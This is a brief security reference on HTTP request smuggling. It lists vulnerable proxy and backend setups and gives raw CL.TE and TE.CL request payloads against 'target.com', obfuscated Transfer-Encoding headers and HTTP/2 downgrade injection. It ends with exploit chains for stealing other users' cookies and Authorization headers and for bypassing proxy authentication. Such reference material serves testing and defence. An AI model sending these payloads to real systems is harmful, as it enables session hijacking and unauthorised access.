# HTTP Request Smuggling Reference

## Attack Surface Signals
- Multi-tier proxy architectures: Cloudflare / Akamai / AWS ALB / Nginx reverse proxy fronting Node.js, Python, Java, or IIS backends.
- Differing HTTP parser specifications (HTTP/1.1 vs HTTP/2 downgrading, CL.TE, TE.CL, TE.TE).

## Core Attack Variants
1. **CL.TE (Frontend uses Content-Length, Backend uses Transfer-Encoding)**:
   ```http
   POST / HTTP/1.1
   Host: target.com
   Content-Length: 13
   Transfer-Encoding: chunked

   0

   SMUGGLED
   ```
2. **TE.CL (Frontend uses Transfer-Encoding, Backend uses Content-Length)**:
   ```http
   POST / HTTP/1.1
   Host: target.com
   Content-Length: 3
   Transfer-Encoding: chunked

   8
   SMUGGLED
   0

   ```
3. **TE.TE (Obfuscated Transfer-Encoding)**:
   - `Transfer-Encoding: xchunked`, `Transfer-Encoding : chunked`, `Transfer-Encoding: chunked
Transfer-Encoding: x`.
4. **H2.CL / H2.TE (HTTP/2 Request Smuggling via Downgrade)**:
   - Frontend speaks HTTP/2, backend speaks HTTP/1.1.
   - Inject `content-length` pseudo-headers or newline characters inside HTTP/2 headers to poison downstream pipeline.

## Exploit Chains
- **Request Smuggling → Admin Session Hijacking**: Smuggled request captures next user's incoming request and headers (`Authorization`, `Cookie`).
- **Request Smuggling → Frontend Security Bypass**: Prepending arbitrary requests that bypass reverse proxy authentication filters.
